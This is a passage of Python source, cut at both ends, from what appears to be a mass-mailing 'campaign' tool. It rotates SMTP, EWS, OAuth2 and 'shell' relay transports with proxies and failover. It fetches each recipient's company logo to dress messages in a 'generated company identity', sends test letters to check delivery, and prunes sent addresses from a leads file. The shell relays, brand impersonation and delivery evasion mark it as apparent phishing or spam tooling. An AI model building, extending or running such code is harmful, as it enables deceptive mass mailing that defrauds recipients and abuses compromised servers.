        entry = get_next_shell_entry() or _single_shell_entry()
    link = str(entry.get('shell_link') or '').strip()
    if not link:
        raise Exception('SHELL: missing relay link (configure shell_config.link, or SHELL/shells.txt as LINK|FROM_MAIL|SENDING_LIMIT)')
    from_mail = str(entry.get('shell_frommail') or shell_config.get('from_mail') or sender or '').strip()
    mime_text = _prepare_mime(msginfo, from_mail)
    mime_param = shell_config.get('param_mime') or 'mime'
    payload = {mime_param: base64.b64encode(mime_text.encode('utf-8', 'replace')).decode('ascii')}
    if shell_config.get('send_fields'):
        payload.setdefault('to', recipient_list[0])
        if from_mail:
            payload.setdefault('from', from_mail)
    headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
    api_key = shell_config.get('api_key') or ''
    if api_key:
        headers[shell_config.get('api_key_name') or 'Authorization'] = api_key
    response = _mode_request_post(link, json_body=payload, headers=headers, proxy=proxy)
    body = (response.text or '').strip()
    if response.status_code < 200 or response.status_code >= 300:
        raise Exception('SHELL relay failed (HTTP {}): {}'.format(response.status_code, body[:300]))
    marker = shell_config.get('success_marker') or ''
    if marker and marker not in body:
        raise Exception('SHELL relay response missing success marker: {}'.format(body[:300]))
    if body:
        try:
            parsed = json.loads(body)
        except ValueError:
            parsed = None
        if isinstance(parsed, dict) and str(parsed.get('status', '')).strip().lower() in ('error', 'fail', 'failed'):
            raise Exception('SHELL relay reported error: {}'.format(body[:300]))
    return True


# --------------------------- unified dispatcher ---------------------------
def _deliver_single(mode, delivery_recipients, envelope_sender, msginfo, smtpserv, port,
                    its_authy, username, password, its_secure, bind_ip=None, proxy=None,
                    smtp_dangerous_override=None):
    """Dispatch one delivery attempt to a single named mode (no wrapping)."""
    if mode == 'host':
        return ConnectVDM(delivery_recipients, envelope_sender, msginfo,
                          bind_ip=bind_ip, proxy=proxy, port=vdm_port,
                          helo_name=vdm_helo, timeout=vdm_timeout, force_mx=vdm_force_mx)
    if mode == 'ews':
        return ConnectEWS(delivery_recipients, envelope_sender, msginfo, bind_ip=bind_ip, proxy=proxy)
    if mode == 'oauth2':
        return ConnectOAuth2(delivery_recipients, envelope_sender, msginfo, bind_ip=bind_ip, proxy=proxy)
    if mode == 'shell':
        return ConnectShell(delivery_recipients, envelope_sender, msginfo, bind_ip=bind_ip, proxy=proxy)
    return ConnectSMTP(smtpserv, int(port), its_authy, username, password, delivery_recipients,
                       envelope_sender, its_secure, msginfo, bind_ip=bind_ip, proxy=proxy,
                       dangerous=smtp_dangerous_override)


def deliver_message(delivery_recipients, envelope_sender, msginfo, smtpserv, port, its_authy,
                    username, password, its_secure, bind_ip=None, proxy=None,
                    smtp_dangerous_override=None, modes_override=None):
    """Deliver through the active mode(s).

    Single mode: call the transport directly so exception text is preserved for
    the caller's retry loops. Multiple modes: ordered failover - each mode is
    attempted in configured order until one succeeds.

    v8.9: modes_override pins the delivery to an explicit mode list. The
    tester&send test phase passes a single-element list so the tester letter is
    delivered through exactly ONE configured transport (the primary/first
    mode), while the main campaign keeps the full ordered failover chain.
    """
    modes = list(modes_override if modes_override else (active_sending_modes or ['smtp']))
    if len(modes) == 1:
        return _deliver_single(modes[0], delivery_recipients, envelope_sender, msginfo, smtpserv,
                               port, its_authy, username, password, its_secure,
                               bind_ip=bind_ip, proxy=proxy, smtp_dangerous_override=smtp_dangerous_override)
    last_error = None
    for index, mode in enumerate(modes):
        try:
            result = _deliver_single(mode, delivery_recipients, envelope_sender, msginfo, smtpserv,
                                     port, its_authy, username, password, its_secure,
                                     bind_ip=bind_ip, proxy=proxy, smtp_dangerous_override=smtp_dangerous_override)
            if result:
                if index > 0:
                    print(f"{Fore.GREEN}[ MODE ] Delivered via failover mode: {MODE_DISPLAY.get(mode, mode.upper())}{Style.RESET_ALL}", flush=True)
                return result
            last_error = Exception('{} delivery returned no result'.format(mode.upper()))
        except Exception as exc:
            last_error = exc
            if index + 1 < len(modes):
                nxt = MODE_DISPLAY.get(modes[index + 1], modes[index + 1].upper())
                print(f"{Fore.YELLOW}[ MODE ] {MODE_DISPLAY.get(mode, mode.upper())} failed ({exc}); trying {nxt}...{Style.RESET_ALL}", flush=True)
    if last_error is not None:
        raise last_error
    return False



def GetFromEmail(str):
    x_dict = str.split (",")
    return random.choice(list(x_dict))


def normalize_sender_address(value, fallback=''):
    """Return a bare RFC email address for SMTP envelope use."""
    from email.utils import parseaddr

    raw = str(value or '').strip()
    _, parsed = parseaddr(raw)
    candidate = parsed or raw
    if re.fullmatch(r"[^\s@<>]+@[^\s@<>]+\.[^\s@<>]+", candidate):
        return candidate
    fallback_raw = str(fallback or '').strip()
    _, fallback_parsed = parseaddr(fallback_raw)
    fallback_candidate = fallback_parsed or fallback_raw
    if re.fullmatch(r"[^\s@<>]+@[^\s@<>]+\.[^\s@<>]+", fallback_candidate):
        return fallback_candidate
    return ''

def GetBanner(email,URL):
    result = ""
    imgurl = ""

    url = URL

    payload = {"email":email,"barnd":"1"}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(url, data=payload, headers=headers)
    response_ans = response.text

    imgurl = str(response_ans)

    def _safe_basename(u):
        p = urllib.parse.urlparse(u).path
        b = os.path.basename(p)
        if not b:
            # fallback to hash
            h = hashlib.md5(u.encode('utf-8')).hexdigest()[:8]
            return f"image_{h}.png"
        # sanitize invalid filename chars for Windows
        b = _re.sub(r'[^A-Za-z0-9._-]', '_', b)
        # append short hash to avoid collisions when query differs
        h = hashlib.md5(u.encode('utf-8')).hexdigest()[:8]
        name, ext = os.path.splitext(b)
        if not ext:
            ext = '.png'
        return f"{name}_{h}{ext}"

    filename = _safe_basename(imgurl)

    subPath = "LOGO_PICS";

    if not os.path.isdir(subPath):
        os.mkdir(subPath)
    dest = os.path.join(subPath, filename)
    if not os.path.exists(dest):
        urllib.request.urlretrieve(imgurl, dest)
    return dest


def _usable_logo_path(path):
    """True when `path` is a real, non-empty image file that can be read.

    Empty/corrupt logo files (e.g. a 0-byte placeholder saved by an earlier
    download) used to be selected by the random-logo picker, which silently
    blanked the {logo}/{logos} placeholder and caused intermittent failures.
    """
    try:
        if not path or not os.path.isfile(path):
            return False
        if os.path.getsize(path) <= 0:
            return False
        with open(path, 'rb') as _probe:
            return bool(_probe.read(1))
    except Exception:
        return False


def get_logo_for_email(email):
    """Download a company logo for the recipient's domain using Clearbit's logo service.
    Saves into `IMG/` and returns the local file path, or None on failure."""
    try:
        domain = email.split('@', 1)[1].strip()
        if not domain:
            return None
        # Normalize domain
        domain = domain.split(':')[0]
        logo_url = f'https://logo.clearbit.com/{domain}'
        os.makedirs('IMG', exist_ok=True)
        safe_domain = _re.sub(r'[^A-Za-z0-9._-]', '_', domain)
        dest = os.path.join('IMG', f'logo_{safe_domain}.png')
        if _usable_logo_path(dest):
            return dest
        try:
            import urllib.request
            req = urllib.request.Request(logo_url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=8) as resp:
                data = resp.read()
                if data:
                    with open(dest, 'wb') as fh:
                        fh.write(data)
                    return dest
        except Exception:
            return None
    except Exception:
        return None


def get_logo_for_company(company_email):
    """Resolve the logo for the generated company identity used in this render."""
    try:
        logo_path = get_logo_for_email(company_email)
        if logo_path:
            return logo_path
    except Exception:
        pass
    return get_random_logo(company_email)

_logo_fallback_cache = None


def eml_rejection_hint(err, recipient_email=''):
    """Return a YELLOW remediation hint when a send failure looks like the SMTP
    relay rejecting the attached .eml file; returns '' otherwise."""
    try:
        if int(eml_setup.get('enable', 0)) != 1:
            return ''
        if int(eml_setup.get('attachToOuter', 1)) != 1:
            return ''
        eml_err = str(err or '').lower()
        if not eml_err:
            return ''
        reject_tokens = ('attachment', 'extension', 'disallowed', 'not allowed', 'blocked', 'file type', 'content type', '550')
        eml_tokens = ('eml', 'rfc822', 'message/')
        if not any(tok in eml_err for tok in reject_tokens):
            return ''
        if not any(tok in eml_err for tok in eml_tokens):
            return ''
        eml_disp = (eml_setup.get('attachName') or '').strip() or eml_setup.get('name') or 'message.eml'
        eml_disp = replace_placeholders(recipient_email or '', str(eml_disp), skip_link=True)
        eml_disp = os.path.basename(str(eml_disp)) or 'message.eml'
        eml_disp = os.path.basename(str(eml_disp)) or 'message.eml'
        return f" {Fore.YELLOW}[EML] The relay may be rejecting the attached '{eml_disp}' file. Set attachToOuter: 0 (YAML: attach_to_outer: false | INI: attachToOuter=0) to stop attaching the .eml to the outer message, or switch attachType/attachName to a permitted type/name.{Style.RESET_ALL}"
    except Exception:
        return ''


def _get_logo_fallback_path():
    """Return the configured fallback logo path (setup.ini -> logo_config -> location)
    if the file exists, otherwise fallback to the first usable local logo. Result is cached module-wide."""
    global _logo_fallback_cache
    if _logo_fallback_cache:
        return _logo_fallback_cache

    location = ''
    try:
        location = str(logo_setup.get('location') or '').strip()
        if location and not os.path.isfile(location):
            location = ''
    except Exception:
        location = ''

    if not location:
        for folder in ('LOGO', 'LOGO_PICS', 'IMG'):
            try:
                if os.path.isdir(folder):
                    for entry in sorted(os.listdir(folder)):
                        path = os.path.join(folder, entry)
                        if path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp', '.svg')) and _usable_logo_path(path):
                            location = path
                            break
                    if location:
                        break
            except Exception:
                pass

    if location:
        _logo_fallback_cache = location
        return location
    return None


def image_to_data_uri(path):
    """Read a local image file and return it as a base64 data: URI, or None."""
    try:
        if not path or not os.path.isfile(path):
            return None
        import mimetypes
        with open(path, 'rb') as _image_file:
            _image_bytes = _image_file.read()
        if not _image_bytes:
            return None
        _image_ctype = mimetypes.guess_type(path)[0] or 'application/octet-stream'
        return 'data:' + _image_ctype + ';base64,' + base64.b64encode(_image_bytes).decode('ascii')
    except Exception:
        return None


def _materialize_data_uri_images(html_text):
    """v9.2: persist base64 <img> data URIs to LOGO_PICS so the normal
    CID/inline pipeline attaches them (sender_config.inline_images=true).

    Some providers strip data: URIs from HTML, so converting them to inline
    attachments keeps the image visible. Returns the rewritten HTML."""
    try:
        pattern = re.compile(r'''src\s*=\s*(["'])(data:image/([a-zA-Z0-9.+\-]+);base64,([^"']+))\1''', re.I)
    except Exception:
        return html_text
    if 'data:image/' not in str(html_text):
        return html_text
    try:
        os.makedirs('LOGO_PICS', exist_ok=True)
    except Exception:
        pass

    def _replace(match):
        ext = (match.group(3) or 'png').lower()
        if ext == 'jpeg':
            ext = 'jpg'
        if ext not in ('png', 'jpg', 'gif', 'bmp', 'webp'):
            ext = 'png'
        try:
            raw = base64.b64decode(''.join(match.group(4).split()))
        except Exception:
            return match.group(0)
        if not raw:
            return match.group(0)
        name = 'inline_' + uuid.uuid4().hex[:12] + '.' + ext
        path = os.path.join('LOGO_PICS', name)
        try:
            with open(path, 'wb') as fh:
                fh.write(raw)
        except Exception:
            return match.group(0)
        return 'src="' + path + '"'

    return pattern.sub(_replace, html_text)


def _resolve_local_image_tokens(value):
    """Replace data:local/,filename tokens with inline data URIs."""
    if not local_image_setup.get('enable', 0):
        return value
    root = str(local_image_setup.get('location') or '').strip()
    if not root:
        return value

    def replace(match):
        relative_name = match.group(1).strip().replace('/', os.sep).replace('\\', os.sep)
        image_path = os.path.abspath(os.path.join(root, relative_name))
        root_path = os.path.abspath(root)
        try:
            if os.path.commonpath((root_path, image_path)) != root_path:
                return match.group(0)
        except ValueError:
            return match.group(0)
        return image_to_data_uri(image_path) or match.group(0)

    return re.sub(r"data:local/,([^\s\"'<>]+)", replace, str(value))


def get_random_logo(seed=None):
    """Pick a random logo image from the local logo folders (LOGO_PICS, IMG, LOGO);
    falls back to the configured fallback logo location. Returns a path or None."""
    try:
        _logo_candidates = []
        candidate_roots = [os.getcwd(), os.path.dirname(os.path.abspath(__file__))]
        seen_roots = set()
        for _root in candidate_roots:
            if not _root or _root in seen_roots:
                continue
            seen_roots.add(_root)
            for _logo_folder in ('LOGO_PICS', 'IMG', 'LOGO'):
                _logo_dir = os.path.join(_root, _logo_folder)
                try:
                    if os.path.isdir(_logo_dir):
                        for _logo_entry in sorted(os.listdir(_logo_dir)):
                            _logo_entry_path = os.path.join(_logo_dir, _logo_entry)
                            if _logo_entry.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp', '.svg')) and _usable_logo_path(_logo_entry_path):
                                _logo_candidates.append(_logo_entry_path)
                except Exception:
                    pass
        if _logo_candidates:
            import random as _random_module
            if seed:
                index = int(hashlib.sha256(str(seed).encode('utf-8')).hexdigest(), 16) % len(_logo_candidates)
                return _logo_candidates[index]
            return _random_module.choice(_logo_candidates)
        return _get_logo_fallback_path()
    except Exception:
        return None


def get_configured_logo_path():
    if not logo_setup.get('enable', 0):
        return None
    path = str(logo_setup.get('location') or '').strip()
    return path if path and os.path.isfile(path) else None


def maybe_send_test_email(smtpserv, port, its_authy, username, password, sender,
                          its_secure, msginfo, bind_ip=None, proxy=None):
    """Send a configured verification copy after each configured interval.

    v3: one copy is delivered through EACH enabled sending mode (smtp, host,
    ews, oauth2, shell) so every enabled transport is verified.
    """
    global sent_since_last_test
    if not test_email_enabled or not test_send_to:
        return
    with success_count_lock:
        sent_since_last_test += 1
        should_send = sent_since_last_test % test_when == 0
    if not should_send:
        return
    modes = list(active_sending_modes or ['smtp'])
    delivered = 0
    for mode in modes:
        try:
            result = _deliver_single(mode, [test_send_to], sender, msginfo, smtpserv, int(port),
                                     its_authy, username, password, its_secure,
                                     bind_ip=bind_ip, proxy=proxy)
            if result:
                delivered += 1
                print(f"{Fore.CYAN}[TEST] Verification copy sent to {test_send_to} via {MODE_DISPLAY.get(mode, mode.upper())}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[TEST] Verification copy via {MODE_DISPLAY.get(mode, mode.upper())} returned no result{Style.RESET_ALL}")
        except Exception as exc:
            print(f"{Fore.YELLOW}[TEST] Verification copy via {MODE_DISPLAY.get(mode, mode.upper())} failed: {exc}{Style.RESET_ALL}")
    if delivered:
        print(f"{Fore.CYAN}[TEST] Verification copies sent to {test_send_to} via {delivered}/{len(modes)} enabled mode(s).{Style.RESET_ALL}")


def _load_test_letter_body():
    """Return (body, path) for the dedicated test letter.

    Prefers test_config.letter, then the main letter, then LETTER/letter.html.
    """
    candidates = []
    if str(test_letter or '').strip():
        candidates.append(str(test_letter).strip())
    main_letter = str(letter_setup.get('letter') or '').strip()
    if main_letter:
        candidates.append(main_letter)
    candidates.append('LETTER/letter.html')
    for candidate in candidates:
        try:
            path = resolve_config_file(candidate, candidate)
        except Exception:
            path = candidate
        try:
            if path and os.path.isfile(path):
                with codecs.open(path, 'r', 'utf8') as handle:
                    return handle.read(), path
        except Exception:
            continue
    return '', (candidates[0] if candidates else '')


def _looks_like_path(value):
    """True when a config value is a file path rather than a literal subject."""
    text = str(value or '').strip()
    if not text:
        return False
    if '/' in text or '\\' in text:
        return True
    return text.lower().endswith(('.html', '.htm', '.txt'))


def _load_test_subject(value):
    """Resolve test_config.subject to the subject text.

    If the value points to an existing file, load the first non-empty line
    as the subject; otherwise treat the value as a literal subject string.
    A path-looking value whose file is missing returns '' so the caller can
    fall back to the normal rotating subject instead of mailing a path.
    """
    candidate = str(value or '').strip()
    if not candidate:
        return ''
    try:
        path = resolve_config_file(candidate, candidate)
    except Exception:
        path = candidate
    try:
        if path and os.path.isfile(path):
            with codecs.open(path, 'r', 'utf8') as handle:
                for line in handle:
                    line = line.strip()
                    if line:
                        return line
    except Exception:
        pass
    if _looks_like_path(candidate):
        return ''
    return candidate


def _normalize_time_unit(value):
    """Normalise a test_config.time_unit value to 'min' or 'sec'."""
    unit = str(value or 'sec').strip().lower()
    if unit in ('min', 'minute', 'minutes', 'm'):
        return 'min'
    return 'sec'


def _normalize_test_pace(value):
    """Normalise a test_config.pace value to 'auto', 'group' or '1by1'.

    'auto' (default): the pace is derived from each tester's own sending
    limit (smtp_max - the last pipe field of the SMTP line, e.g.
    smtp.gmx.de|587|tls|user@x.com|pass|user@x.com|true|100 -> 100).
    A tester with an unlimited limit (-1) runs '1by1'; a tester with a
    numeric limit (100, 200, ...) runs 'group'.

    'group': force the group pace for every tester - the test phase delivers
    the test letter to all leads, waits test_config.time, then the main
    campaign runs for all leads.

    '1by1': force per-lead interleaving for every tester - test one lead,
    wait test_config.time, then send the main campaign to that same lead
    through the same SMTP tester that made the test, then move to the next
    lead.
    """
    pace = str(value or 'auto').strip().lower()
    if pace in ('1by1', 'onebyone', 'one-by-one', 'single', 'one'):
        return '1by1'
    if pace in ('group', 'batch', 'all'):
        return 'group'
    return 'auto'


def _entry_pace(entry, mode):
    """Return the pace ('1by1' or 'group') for one tester entry.

    mode is the normalised test_config.pace value. 'group' / '1by1' force the
    pace for every tester; 'auto' derives it from the tester's own sending
    limit (smtp_max): -1 (unlimited) -> '1by1', a numeric limit -> 'group'.
    """
    if mode == 'group':
        return 'group'
    if mode == '1by1':
        return '1by1'
    # auto: the sending limit decides.
    if entry is None or entry.get('_synthetic'):
        return 'group'
    return 'group' if _entry_smtp_max(entry) >= 0 else '1by1'


def test_delay_seconds(letter_delay=None, time_unit=None):
    """test_config.time converted to seconds using test_config.time_unit.

    Optional overrides let the test&send phase use its own snapshot of the
    config: a mid-phase config reload can reset the runtime test_config
    globals, so the phase must not re-read them here.
    """
    if letter_delay is None:
        letter_delay = test_letter_delay
    if time_unit is None:
        time_unit = test_time_unit
    try:
        delay = max(0, int(letter_delay))
    except Exception:
        delay = 0
    return delay * (60 if time_unit == 'min' else 1)


def plan_test_send_groups(total, group_size, tester_count):
    """Return a per-position tester-index list for `total` leads.

    group_size == 0: the leads are split evenly across the testers (the first
    tester gets ceil(total/testers), then the next, ...).
    group_size > 0: consecutive chunks of `group_size` leads are assigned
    round-robin to the testers (group i -> tester i % tester_count).
    """
    try:
        total = max(0, int(total or 0))
    except Exception:
        total = 0
    try:
        tester_count = max(0, int(tester_count or 0))
    except Exception:
        tester_count = 0
    if total == 0 or tester_count == 0:
        return []
    try:
        group_size = max(0, int(group_size or 0))
    except Exception:
        group_size = 0
    if group_size > 0:
        return [(i // group_size) % tester_count for i in range(total)]
    chunk = -(-total // tester_count)  # ceil division
    return [min(i // chunk, tester_count - 1) for i in range(total)]


def build_tester_rotation(testers, selection_system):
    """Order the tester pool the same way select_smtp_entry rotates SMTPs.

    selection_system 1 (Cyclic) keeps the pool order (round-robin); every
    other system (2-5) mirrors select_smtp_entry's random.choice behaviour.
    """
    pool = list(testers or [])
    if not pool:
        return []
    if int(selection_system or 1) == 1:
        return list(pool)
    shuffled = list(pool)
    random.shuffle(shuffled)
    return shuffled


def _entry_smtp_max(entry):
    """Return an SMTP entry's per-tester sending limit (smtp_max).

    smtp_max is the last pipe field of an SMTP pool line, e.g.
    smtp.gmx.de|587|tls|user@x.com|pass|user@x.com|true|100 -> 100.
    -1 (or a missing field) means unlimited.
    """
    try:
        return int(entry.get('smtp_max', -1))
    except (TypeError, ValueError):
        return -1


def _lead_key(value):
    """Normalise a lead/email string to a stable dedupe key.

    Strips surrounding whitespace, an inline '#' comment, a 'mailto:' prefix,
    surrounding angle brackets / quotes and lower-cases the result. Returns ''
    when the value does not look like an address (no '@').
    """
    text = str(value or '').strip()
    if '#' in text:
        text = text.split('#', 1)[0]
    text = text.strip()
    if text.lower().startswith('mailto:'):
        text = text[7:]
    text = text.strip()
    # "Display Name <addr@host>" -> addr@host
    if '<' in text and '>' in text and text.index('<') < text.index('>'):
        text = text[text.index('<') + 1:text.index('>')].strip()
    if text.startswith('<') and text.endswith('>'):
        text = text[1:-1].strip()
    text = text.strip('"').strip("'").strip()
    if '@' not in text:
        return ''
    return text.lower()


def _test_send_ledger_path(kind):
    """Return the on-disk ledger path for 'tested' or 'sent' addresses."""
    base = str(test_send_ledger_dir or record_folder or 'records').strip() or 'records'
    return os.path.join(base, f'test_send_{kind}.txt')


def load_test_send_ledger():
    """Load the persistent tester&send ledger; return (tested, sent) sets.

    The ledger records every address already tested and already
    campaign-processed by tester&send mode so a re-run (or another tester SMTP)
    never re-attempts the same mailbox. Failures are non-fatal: an unreadable
    ledger yields empty sets.
    """
    tested, sent = set(), set()
    for kind, target in (('tested', tested), ('sent', sent)):
        try:
            path = _test_send_ledger_path(kind)
            if not os.path.exists(path):
                continue
            with open(path, 'r', encoding='utf-8') as fh:
                for raw in fh:
                    key = _lead_key(raw)
                    if key:
                        target.add(key)
        except Exception:
            continue
    return tested, sent


def record_test_send_ledger(kind, value):
    """Append one normalised address to the persistent tester&send ledger.

    kind is 'tested' (test phase) or 'sent' (main campaign). Thread-safe and
    non-fatal: a write failure never interrupts sending.
    """
    key = _lead_key(value)
    if not key:
        return
    try:
        path = _test_send_ledger_path(kind)
        with test_send_ledger_lock:
            os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
            existing = set()
            if os.path.exists(path):
                with open(path, 'r', encoding='utf-8') as fh:
                    for raw in fh:
                        k = _lead_key(raw)
                        if k:
                            existing.add(k)
            if key in existing:
                return
            with open(path, 'a', encoding='utf-8') as fh:
                fh.write(key + '\n')
                fh.flush()
                try:
                    os.fsync(fh.fileno())
                except Exception:
                    pass
    except Exception:
        pass


def reset_test_send_ledger():
    """Wipe the tester&send ledger so a new run starts from a clean slate.

    v8: skip_processed dedupes inside ONE run (across tester SMTPs and
    duplicate lead lines) but must never leak into the next run. Called once
    per tester&send phase unless test_config.ledger_persist is true. Failures
    are non-fatal: an unwritable ledger simply keeps whatever it had.
    """
    for kind in ('tested', 'sent'):
        try:
            path = _test_send_ledger_path(kind)
            with test_send_ledger_lock:
                os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
                with open(path, 'w', encoding='utf-8') as fh:
                    fh.flush()
                    try:
                        os.fsync(fh.fileno())
                    except Exception:
                        pass
        except Exception:
            continue


def campaign_lead_skip_processed(email):
    """Return True when tester&send should skip this main-campaign lead.

    A lead is skipped when skip_processed is on and its normalised key is
    already known to tester&send:

    * in test_send_campaign_seen - already queued earlier in this same campaign
      loop (duplicate lines in leads.txt), or
    * in the ledger snapshot (test_send_attempted / test_send_sent). That
      snapshot is normally EMPTY because v8 wipes the ledger at the start of
      every run; it is only populated when test_config.ledger_persist is on,
      in which case a previous run's tested/sent addresses are skipped too.

    Leads tested during the CURRENT run are never in test_send_attempted, so
    the normal test-then-campaign flow still sends to them. Every non-skipped
    lead is registered in test_send_campaign_seen so later duplicates are
    caught too.
    """
    if not (test_and_send_mode and test_send_skip_processed):
        return False
    key = _lead_key(email) or str(email or '').strip().lower()
    if not key:
        return False
    if (key in test_send_sent or key in test_send_campaign_seen
            or key in test_send_attempted):
        return True
    test_send_campaign_seen.add(key)
    return False


# v8.3: delete_config - remove fully processed leads from leads.txt.
def _delete_lead_lines(path, keys):
    """Remove every line in ``path`` whose normalized key is in ``keys``.

    Returns the number of lines removed. The file is rewritten atomically
    (tmp file + os.replace) and CRLF/LF endings are preserved by reading and
    writing with newline='' so no newline translation happens.
    """
    try:
        with open(path, 'r', encoding='utf-8', newline='') as fh:
            lines = fh.readlines()
    except Exception:
        return 0
    kept = []
    removed = 0
    for line in lines:
        stripped = line.rstrip('\r\n')
        if not stripped.strip():
            kept.append(line)
            continue
        key = _lead_key(stripped)
        if key and key in keys:
            removed += 1
            continue
        kept.append(line)
    if not removed:
        return 0
    try:
        tmp = f"{path}.delete_tmp"
        with open(tmp, 'w', encoding='utf-8', newline='') as fh:
            fh.writelines(kept)
        os.replace(tmp, path)
    except Exception:
        return 0
    return removed


def _delete_processed_lead_one(email):
    """Delete a single address from leads.txt once it is fully processed."""
    key = _lead_key(email) or str(email or '').strip().lower()
    if not key:
        return
    # In tester&send mode a lead is only "fully processed" once the tester
    # letter went out THIS run; the main-campaign success hook fires later.
    if test_and_send_mode and key not in test_send_tested_run:
        return
    with delete_config_lock:
        if key in delete_config_deleted:
            return
        path = delete_leads_path or resolve_leads_path(leads_setup_target)
        removed = _delete_lead_lines(path, {key})
        delete_config_deleted.add(key)
        if removed:
            print(f"{Fore.YELLOW}[DELETE] {email} removed from {path} "
                  f"(delete_config){Style.RESET_ALL}", flush=True)


def delete_processed_lead(email):
    """Delete ``email`` from leads.txt once it is fully processed.

    Gated by ``delete_config.enable``. Semantics:

    * all sending modes: a lead is deleted once the main campaign sent to it;
    * tester&send mode: the lead must have received BOTH the tester letter
      (registered in ``test_send_tested_run`` during this run) AND the main
      campaign letter;
    * tester-only mode (no main campaign): never deletes.

    Non-fatal: every error is swallowed so deletion can never stop sending.
    Thread-safe and de-duplicated per run via ``delete_config_deleted``.
    """
    try:
        if not delete_config_enable:
            return
        # tester-only mode (tester without the &send campaign) never deletes.
        if tester_mode and not tester_send_mode:
            return
        recipients = email if isinstance(email, (list, tuple, set)) else [email]
        for _rcpt in recipients:
            _delete_processed_lead_one(_rcpt)
    except Exception:
        pass


def plan_test_send_groups_v3(total, group_size, testers, selection_system):
    """Return (assignments, testers) for the test&send v3 phase.

    The tester order follows the multiple-SMTP rotation (selection_system):
    1 = Cyclic (pool order), 2-5 = Random (mirrors select_smtp_entry). Leads
    are handed to the testers in that order in chunks of `group_size` (or,
    when group_size == 0, in chunks sized by each tester's own sending limit
    - the smtp_max / last pipe field of the SMTP line). A tester whose
    smtp_max limit is reached is skipped; leads that cannot be assigned (all
    testers exhausted) are left unpinned (None) so the campaign uses the
    normal pool rotation for them.

    v6 sizing (group_size == 0): each tester's group is its own smtp_max
    (e.g. ...|true|100 -> that tester owns up to 100 leads). Testers without
    a limit (smtp_max -1) share the remaining leads evenly. When every tester
    is unlimited this is the classic even split.
    """
    try:
        total = max(0, int(total or 0))
    except Exception:
        total = 0
    if total == 0 or not testers:
        return [], list(testers or [])
    try:
        group_size = max(0, int(group_size or 0))
    except Exception:
        group_size = 0
    pool = list(testers)
    indexed = list(enumerate(pool))
    if int(selection_system or 1) == 1:
        rotation = list(indexed)
    else:
        rotation = list(indexed)
        random.shuffle(rotation)
    remaining = {}
    for idx, entry in indexed:
        limit = _entry_smtp_max(entry)
        remaining[idx] = -1 if limit < 0 else max(0, limit)
    assignments = [None] * total
    pos = 0
    if group_size > 0:
        # v3/v5: fixed-size chunks round-robin across the testers.
        chunk = group_size
        while pos < total:
            progressed = False
            for idx, entry in rotation:
                if remaining[idx] == 0:
                    continue
                take = min(chunk, total - pos)
                if remaining[idx] > 0:
                    take = min(take, remaining[idx])
                for i in range(pos, pos + take):
                    assignments[i] = idx
                pos += take
                if remaining[idx] > 0:
                    remaining[idx] -= take
                progressed = True
                if pos >= total:
                    break
            if not progressed:
                break
    else:
        # v6: sending_limit-driven sizing. Each tester with an smtp_max limit
        # owns a consecutive group of up to smtp_max leads (in rotation
        # order); testers without a limit (smtp_max -1) share the remaining
        # leads evenly. An all-unlimited pool keeps the classic even split.
        unlimited = [idx for idx, _ in rotation if remaining[idx] == -1]
        for idx, _ in rotation:
            limit = remaining[idx]
            if limit <= 0:
                continue
            take = min(limit, total - pos)
            for i in range(pos, pos + take):
                assignments[i] = idx
            pos += take
            remaining[idx] = 0
            if pos >= total:
                break
        if pos < total and unlimited:
            even_chunk = -(-(total - pos) // len(unlimited))
            for idx in unlimited:
                take = min(even_chunk, total - pos)
                for i in range(pos, pos + take):
                    assignments[i] = idx
                pos += take
                if pos >= total:
                    break
    return assignments, pool


def resolve_campaign_smtp(line_num, smtp_pool_entries, selection_system):
    """Return the SMTP entry used for one campaign line.

    In test&send v2 the lead is pinned to the tester that successfully tested
    it (test_send_assignments / test_send_testers). Without an assignment the
    normal pool rotation is used.
    """
    if test_send_assignments and test_send_testers and line_num - 1 < len(test_send_assignments):
        tester_idx = test_send_assignments[line_num - 1]
        if tester_idx is not None and tester_idx < len(test_send_testers):
            return test_send_testers[tester_idx]
    return select_smtp_entry(smtp_pool_entries, selection_system)


def _resolve_tester_fromname(email, tester_fromname, entry=None, sender='', fromemail=''):
    """v8.4: resolve test_config.testerfromname for one tester letter.

    Supports the {smtpfrommail}/{SMTPFROMMAIL} placeholders, which resolve to
    the acting tester SMTP's from-mail (the pool entry's smtp_fromemail,
    falling back to the phase sender/fromemail for single-SMTP runs). Returns
    '' when no tester fromname is configured, so the campaign fromname is
    kept unchanged.
    """
    text = str(tester_fromname or '').strip()
    if not text:
        return ''
    acting = ''
    if entry:
        acting = str(entry.get('smtp_fromemail') or entry.get('msg_fromemail') or '').strip()
    if not acting:
        acting = str(sender or fromemail or '').strip()
    # Pin the acting tester SMTP from-mail FIRST - the generic placeholder
    # engine maps {smtpfrommail} to the campaign-level current_smtp_frommail,
    # which is not the acting tester SMTP in the pinned-pool case.
    resolved = str(text).replace('{smtpfrommail}', acting).replace('{SMTPFROMMAIL}', acting)
    resolved = resolved.replace('{frommail}', acting).replace('{FROMMAIL}', acting)
    try:
        resolved = replace_placeholders(email, resolved)
    except Exception:
        pass
    return str(resolved or '').strip()


def run_test_send_phase(leads, smtpserv, port, its_authy, username, password,
                        fromemail, sender, its_secure,
                        smtp_pool_entries=None, use_random_smtp=False):
    """test&send / tester pre-campaign phase (v3 rotation + v4 tester modes).

    When sending_mode contains the reserved 'test&send' token (or the v4
    'tester' / 'tester&send' tokens) and test_config.enable is true, the
    sender first delivers the dedicated test letter (test_config.subject /
    test_config.letter) to the leads using the active sending mode(s). It
    then waits test_config.time (in test_config.time_unit seconds or minutes)
    before the main campaign begins.

    With test_config.enable_multiple true and a multiple SMTP pool available,
    every pool entry becomes a "tester" that owns a group of leads:

      * test_config.group_size == 0 -> v6 sending_limit-driven sizing: each
        tester owns up to its own smtp_max leads (the last pipe field of the
        SMTP line, e.g. ...|true|100); testers without a limit share the
        remaining leads evenly. An all-unlimited pool keeps the classic even
        split (first tester gets ceil(total/testers), then the next, ...).
      * test_config.group_size == N -> consecutive chunks of N leads are
        assigned round-robin to the testers (group i -> tester i % count).

